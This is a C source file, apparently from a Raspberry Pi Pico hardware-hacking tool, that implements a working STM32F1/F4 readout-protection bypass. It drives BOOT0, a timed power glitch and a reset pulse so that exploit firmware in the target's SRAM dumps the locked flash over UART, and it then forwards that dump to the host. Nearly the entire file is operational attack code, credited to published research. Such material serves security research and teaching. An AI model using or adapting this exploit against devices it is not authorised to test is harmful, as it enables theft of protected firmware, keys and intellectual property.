/*
 * STM32 RDP Bypass Integration for Raiden-Pico
 *
 * Supports STM32F1 and STM32F4 series
 *
 * Based on stm32f1-picopwner and stimpik by Patrick Pedersen (CTXz)
 * Original attack by Johannes Obermaier, Marc Schink and Kosma Moczek
 * Paper: https://www.usenix.org/system/files/woot20-paper-obermaier.pdf
 *
 * Attack sequence:
 *   1. Set BOOT0 high, power on (boot from SRAM)
 *   2. [User loads exploit firmware via debug probe]
 *   3. Power off, wait fixed cycle count, power on immediately
 *   4. Wait ~10ms for SRAM exploit stage 1 (sets up FPB)
 *   5. Set BOOT0 low, wait 1ms, pulse reset (boot from flash with FPB redirect)
 *   6. Wait for dump magic bytes
 *   7. Forward flash dump data
 *
 * Target connections (Pico side is always GP4/GP5 at 9600 baud):
 *   STM32F1: Connect to PA9 (TX) / PA10 (RX) - USART1
 *   STM32F4: Connect to PC10 (TX) / PC11 (RX) - USART4
 */

#include "stm32_pwner.h"
#include "uart_cli.h"
#include "pico/stdlib.h"
#include "hardware/uart.h"
#include "hardware/gpio.h"
#include <stdio.h>
#include <string.h>

// Module state
static stm32_state_t state = STM32_STATE_IDLE;
static uint8_t boot0_pin = STM32_BOOT0_PIN;
static uint8_t boot1_pin = STM32_BOOT1_PIN;
static uint32_t bytes_received = 0;
static bool initialized = false;

// Magic detection state
static uint8_t magic_index = 0;
static const uint8_t dump_magic[] = {STM32_DUMP_MAGIC_0, STM32_DUMP_MAGIC_1,
                                      STM32_DUMP_MAGIC_2, STM32_DUMP_MAGIC_3};

// Forward declarations
static void init_gpio(void);
static void init_uart(void);
static void set_power(bool on);
static void set_boot0(bool high);
static void set_reset_output(bool low);
static void set_reset_input(void);
static bool get_reset_state(void);
static bool wait_for_reset_low(uint32_t timeout_ms);

void stm32_pwner_init(void) {
    init_gpio();
    init_uart();

    state = STM32_STATE_IDLE;
    bytes_received = 0;
    magic_index = 0;
    initialized = true;

    uart_cli_send("OK: STM32 pwner initialized\r\n");
}

void stm32_pwner_set_boot0_pin(uint8_t pin) {
    boot0_pin = pin;
    gpio_init(boot0_pin);
    gpio_set_dir(boot0_pin, GPIO_OUT);
    gpio_put(boot0_pin, 0);
    uart_cli_printf("OK: BOOT0 pin set to GP%u\r\n", pin);
}

uint8_t stm32_pwner_get_boot0_pin(void) {
    return boot0_pin;
}

void stm32_pwner_set_boot0(bool high) {
    // Only init BOOT0 GPIO, not full module (avoid UART conflict)
    static bool boot0_gpio_initialized = false;
    if (!boot0_gpio_initialized) {
        gpio_init(boot0_pin);
        gpio_set_dir(boot0_pin, GPIO_OUT);
        boot0_gpio_initialized = true;
    }
    gpio_put(boot0_pin, high ? 1 : 0);
    uart_cli_printf("OK: BOOT0 = %s\r\n", high ? "HIGH" : "LOW");
}

void stm32_pwner_set_boot1_pin(uint8_t pin) {
    boot1_pin = pin;
    gpio_init(boot1_pin);
    gpio_set_dir(boot1_pin, GPIO_OUT);
    gpio_put(boot1_pin, 0);
    uart_cli_printf("OK: BOOT1 pin set to GP%u\r\n", pin);
}

uint8_t stm32_pwner_get_boot1_pin(void) {
    return boot1_pin;
}

void stm32_pwner_set_boot1(bool high) {
    if (!initialized) {
        stm32_pwner_init();
    }
    gpio_put(boot1_pin, high ? 1 : 0);
    uart_cli_printf("OK: BOOT1 = %s\r\n", high ? "HIGH" : "LOW");
}

stm32_result_t stm32_pwner_attack(void) {
    if (!initialized) {
        stm32_pwner_init();
    }

    uart_cli_send("STM32 RDP bypass attack starting...\r\n");
    uart_cli_send("  Ensure exploit firmware is loaded in target SRAM!\r\n");

    // Reset state
    bytes_received = 0;
    magic_index = 0;
    state = STM32_STATE_GLITCHING;

    // Step 1: Set BOOT0 high to boot from SRAM
    set_boot0(true);
    uart_cli_send("  [1] BOOT0 = HIGH (SRAM boot mode)\r\n");

    // Step 2: Ensure power is on
    set_power(true);
    uart_cli_send("  [2] Power ON\r\n");
    sleep_ms(100);  // Let target stabilize

    // Step 3: Power glitch - cut power and restore quickly
    uart_cli_send("  [3] Executing power glitch...\r\n");
    set_power(false);

    // Wait fixed cycle count (more reliable than monitoring reset pin)
    // This timing depends on board capacitance - adjust STM32_POWEROFF_LOOPS if needed
    volatile uint32_t count = 0;
    while (count < STM32_POWEROFF_LOOPS) {
        count++;
        __asm volatile ("nop");
    }

    // Immediately restore power - this is the glitch!
    // SRAM contents survive briefly, debugger lock clears on power cycle
    set_power(true);
    uart_cli_printf("  [4] Power restored after %u cycles - SRAM exploit running\r\n", count);

    // Step 4: Wait for stage 1 exploit to set up FPB
    sleep_ms(STM32_STAGE1_DELAY_MS);

    // Step 5: Set BOOT0 low (flash boot mode) and reset
    set_boot0(false);
    uart_cli_send("  [5] BOOT0 = LOW (flash boot mode)\r\n");
    sleep_ms(STM32_BOOT0_DELAY_MS);  // Brief delay before reset

    // Pulse reset
    set_reset_output(true);  // Assert reset (active low)
    sleep_ms(STM32_RESET_DELAY_MS);
    set_reset_input();  // Release reset
    uart_cli_send("  [6] Reset released - FPB redirecting to stage 2\r\n");

    // Step 6: Wait for dump magic bytes
    state = STM32_STATE_WAITING_MAGIC;
    uart_cli_send("  [7] Waiting for dump magic...\r\n");

    uint32_t timeout = 5000;  // 5 second timeout for magic
    uint32_t start = to_ms_since_boot(get_absolute_time());

    while (state == STM32_STATE_WAITING_MAGIC) {
        if (uart_is_readable(STM32_UART_ID)) {
            uint8_t c = uart_getc(STM32_UART_ID);

            if (c == dump_magic[magic_index]) {
                magic_index++;
                if (magic_index >= sizeof(dump_magic)) {
                    state = STM32_STATE_DUMPING;
                    uart_cli_send("  [8] Magic received - dumping flash!\r\n");
                    break;
                }
            } else {
                magic_index = 0;  // Reset on mismatch
            }
        }

        if ((to_ms_since_boot(get_absolute_time()) - start) > timeout) {
            uart_cli_send("ERROR: Timeout waiting for dump magic\r\n");
            state = STM32_STATE_ERROR;
            return STM32_ERR_NO_MAGIC;
        }

        tight_loop_contents();
    }

    // Now in dumping state - caller should use stm32_pwner_process()
    // to receive data and forward to host
    return STM32_OK;
}

void stm32_pwner_process(void) {
    if (state != STM32_STATE_DUMPING) {
        return;
    }

    // Read and forward UART data
    while (uart_is_readable(STM32_UART_ID)) {
        uint8_t c = uart_getc(STM32_UART_ID);
        putchar(c);  // Forward to USB CDC
        bytes_received++;
    }
}

stm32_state_t stm32_pwner_get_state(void) {
    return state;
}

uint32_t stm32_pwner_get_bytes_received(void) {
    return bytes_received;
}

void stm32_pwner_abort(void) {
    state = STM32_STATE_IDLE;
    set_power(true);  // Ensure power stays on
    set_boot0(false);
    set_reset_input();
    uart_cli_send("STM32 attack aborted\r\n");
}

const char* stm32_result_str(stm32_result_t result) {
    switch (result) {
        case STM32_OK:                  return "OK";
        case STM32_ERR_NOT_INITIALIZED: return "Not initialized";
        case STM32_ERR_TIMEOUT:         return "Timeout";
        case STM32_ERR_NO_MAGIC:        return "No dump magic received";
        case STM32_ERR_UART_FAIL:       return "UART failure";
        default:                        return "Unknown error";
    }
}

// --- Internal functions ---

static void init_gpio(void) {
    // Initialize BOOT0 pin
    gpio_init(boot0_pin);
    gpio_set_dir(boot0_pin, GPIO_OUT);
    gpio_put(boot0_pin, 0);  // Default low (flash boot)

    // Initialize BOOT1 pin
    gpio_init(boot1_pin);
    gpio_set_dir(boot1_pin, GPIO_OUT);
    gpio_put(boot1_pin, 0);  // Default low (bootloader mode when BOOT0=1)

    // Power pin (GP10) - use existing target_uart infrastructure
    gpio_init(STM32_POWER_PIN);
    gpio_set_dir(STM32_POWER_PIN, GPIO_OUT);
    gpio_put(STM32_POWER_PIN, 1);  // Default on

    // Reset pin (GP15) - start as input with pull-up
    gpio_init(STM32_RESET_PIN);
    gpio_set_dir(STM32_RESET_PIN, GPIO_IN);
    gpio_pull_up(STM32_RESET_PIN);
}

static void init_uart(void) {
    // Initialize UART1 for target communication at 9600 baud
    // STM32 bootloader requires EVEN parity (8E1)
    uart_init(STM32_UART_ID, STM32_UART_BAUD);
    gpio_set_function(STM32_UART_TX_PIN, GPIO_FUNC_UART);
    gpio_set_function(STM32_UART_RX_PIN, GPIO_FUNC_UART);
    uart_set_format(STM32_UART_ID, 8, 1, UART_PARITY_EVEN);
    uart_set_fifo_enabled(STM32_UART_ID, true);
}

static void set_power(bool on) {
    gpio_put(STM32_POWER_PIN, on ? 1 : 0);
}

static void set_boot0(bool high) {
    gpio_put(boot0_pin, high ? 1 : 0);
}

static void set_reset_output(bool active) {
    gpio_set_dir(STM32_RESET_PIN, GPIO_OUT);
    gpio_put(STM32_RESET_PIN, active ? 0 : 1);  // Active low
}

static void set_reset_input(void) {
    gpio_set_dir(STM32_RESET_PIN, GPIO_IN);
    gpio_pull_up(STM32_RESET_PIN);
}

static bool get_reset_state(void) {
    return gpio_get(STM32_RESET_PIN);
}

static bool wait_for_reset_low(uint32_t timeout_ms) {
    uint32_t start = to_ms_since_boot(get_absolute_time());

    while (get_reset_state()) {  // While reset is high
        if ((to_ms_since_boot(get_absolute_time()) - start) > timeout_ms) {
            return false;
        }
        tight_loop_contents();
    }

    return true;
}
